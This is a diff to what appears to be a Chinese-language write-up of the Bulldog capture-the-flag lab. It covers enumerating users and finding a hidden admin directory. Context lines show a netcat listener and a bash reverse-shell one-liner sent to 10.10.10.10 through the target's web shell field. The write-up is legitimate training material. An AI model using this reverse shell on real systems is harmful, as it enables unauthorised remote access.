@@ -11,7 +11,9 @@ We'll remove these in prod. It's not like a hacker can do anything with a hash
 發現/dev/shell網頁，登入sarah後擁有權限，試圖用bash反彈shell，失敗，最後用echo成功  
 攻擊機:`nc -l 3333`  
 靶機shell欄位:`echo "bash -i >& /dev/tcp/10.10.10.10/3333 0>&1" | bash`  
-查看可疑user，發現bulldogadmin和django，查看bulldogadmin文件，發現可疑目錄/home/bulldogadmin/.hiddenadmindirectory
+
+查看可疑user，發現bulldogadmin和django  
+查看bulldogadmin文件，發現可疑目錄/bulldogadmin/.hiddenadmindirectory
 從note中發現提示
 
 > Literally run the app, give your account password
